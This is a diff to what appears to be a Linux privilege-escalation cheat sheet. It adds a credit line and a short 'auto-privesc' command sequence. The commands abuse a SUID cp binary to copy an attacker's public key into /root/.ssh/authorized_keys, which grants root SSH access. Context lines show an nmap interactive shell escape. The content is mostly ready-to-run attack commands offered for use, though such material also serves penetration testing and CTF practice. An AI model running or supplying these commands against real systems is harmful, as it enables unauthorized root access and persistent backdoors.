@@ -619,7 +619,7 @@ nmap --interactive
 !sh
 ```
 
-### Getting shell using SUID cp
+### Getting shell using SUID cp. Thanks to @iiLegacyyii
 
 ```
 1. Create a paired ssh key using ssh-keygen from your box and "chmod 600 id_rsa" + "chmod 600 id_rsa.pub"
@@ -627,4 +627,12 @@ nmap --interactive
 3. Create a .ssh folder and create an "authorized_keys" file
 4. Dump your public key data into the authorized_keys file
 5. Use the following cp command to create a .ssh folder as root and copy authorized_keys into it "cp --parents .ssh/authorized_keys /root"
+
+auto-privesc below
+
+mkdir /dev/shm/.ssh
+touch /dev/shm/.ssh/authorized_keys
+echo "<public_key_data>" > /dev/shm/.ssh/authorized_keys
+cd /dev/shm
+cp --parents .ssh/authorized_keys /root
 ```
